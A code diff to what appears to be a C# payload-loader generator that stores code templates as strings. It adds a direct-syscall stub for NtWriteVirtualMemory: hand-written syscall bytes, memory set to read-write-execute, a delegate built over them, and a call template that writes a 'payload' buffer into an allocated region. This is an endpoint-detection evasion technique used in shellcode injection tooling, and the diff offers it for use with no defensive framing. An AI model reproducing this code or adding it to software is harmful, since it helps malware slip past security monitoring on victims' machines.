@@ -46,6 +46,7 @@ public static uint NtAllocateVirtualMemory(
                 Protect);
         }
     }
+}
 ";
 
         public static string delegate_NtAllocateVirtualMemory = @"
@@ -81,15 +82,67 @@ catch
         #region NtWriteVirtualMemory
 
         public static string method_NtWriteVirtualMemory = @"
+static byte[] bNtWriteVirtualMemory =
+{
+    0x4C, 0x8B, 0xD1,               // mov r10,rcx
+    0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax,3ah
+    0x0F, 0x05,                     // syscall
+    0xC3                            // ret
+};
 
+public static uint NtWriteVirtualMemory(
+    IntPtr ProcessHandle,
+    IntPtr BaseAddress,
+    byte[] Buffer,
+    int BufferSize,
+    int NumberOfBytesWritten)
+{
+    byte[] syscall = bNtWriteVirtualMemory;
+
+    unsafe
+    {
+        fixed (byte* ptr = syscall)
+        {
+            IntPtr memoryAddress = (IntPtr)ptr;
+
+            if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+            {
+                throw new Win32Exception();
+            }
+
+            Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));
+
+            return assembledFunction(
+                ProcessHandle,
+                BaseAddress,
+                Buffer,
+                BufferSize,
+                NumberOfBytesWritten);
+        }
+    }
+}
 ";
 
         public static string delegate_NtWriteteVirtualMemory = @"
-
+[UnmanagedFunctionPointer(CallingConvention.StdCall)]
+public delegate uint NtWriteVirtualMemory(
+    IntPtr ProcessHandle,
+    IntPtr BaseAddress,
+    byte[] Buffer,
+    int BufferSize,
+    int NumberOfBytesWritten);
 ";
 
         public static string call_NtWriteVirtualMemory = @"
-
+uint ntWVMResult = 0;
+try
+{
+    ntWVMResult = Syscalls.NtWriteVirtualMemory(hCurrentProcess, pMemoryAllocation, payload, payload.Length, 0);
+}
+catch
+{
+    return;
+}
 ";
 
         #endregion
